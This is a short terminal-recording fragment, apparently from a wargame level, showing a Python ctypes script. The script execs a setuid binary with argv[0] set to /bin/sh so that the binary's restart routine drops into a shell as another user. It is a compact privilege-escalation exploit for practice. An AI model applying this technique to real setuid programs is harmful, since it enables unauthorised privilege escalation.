[54.017275, "o", "     1\timport ctypes, sys, os\r\r\n     2\tprog = sys.argv[1].encode()\r\r\n     3\t# argv[0] is what restart() re-execs: point it at /bin/sh so the setuid\r\r\n     4\t# binary drops us into a shell as vortex7\r\r\n     5\targv = [b\"/bin/sh\"] + [None]\r\r\n     6\tenv = [b\"PATH=/bin:/usr/bin\", b\"TERM=xterm\"] + [None]\r\r\n     7\tlibc = ctypes.CDLL(\"libc.so.6\")\r\r\n     8\tARGV = (ctypes.c_char_p * len(argv))(*argv)\r\r\n     9\tENVP = (ctypes.c_char_p * len(env))(*env)\r\r\n    10\tlibc.execve(prog, ARGV, ENVP)\r\r\n    11\tprint(\"execve failed\", ctypes.get_errno())\r\r\n    12\t\r\r\n"]
[54.024721, "o", "\u001b]3008;end=2907713b-4f45-4037-8b60-0aadcdb865df;exit=success\u001b\\"]
